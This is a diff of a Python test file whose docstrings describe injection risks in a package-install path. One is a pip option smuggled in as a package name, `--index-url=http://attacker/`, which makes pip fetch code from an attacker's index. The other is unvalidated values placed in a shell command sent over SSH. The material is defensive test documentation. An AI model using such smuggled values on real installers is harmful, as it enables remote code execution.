@@ -1,6 +1,6 @@
 """A "package" must be a package name, not an instruction to pip or a shell.
 
-⚠ Two exposures, one answer. Locally the command is built as a *list*, so there
+Two exposures, one answer. Locally the command is built as a *list*, so there
 is no shell — but pip reads its own options from positional arguments, so
 `--index-url=http://attacker/` is honoured as configuration and the install
 fetches and executes code from an attacker-chosen index. Remotely that same list
@@ -126,7 +126,7 @@ async def _noop(*_a: Any, **_kw: Any) -> None:
 
 
 class TestValuesHandedToTheRemoteShell:
-    """⚠ The launch command is a *string* sent over SSH, so every value in it is
+    """The launch command is a *string* sent over SSH, so every value in it is
     shell syntax.
 
     `broker` comes straight off the task payload with no validation at all, so
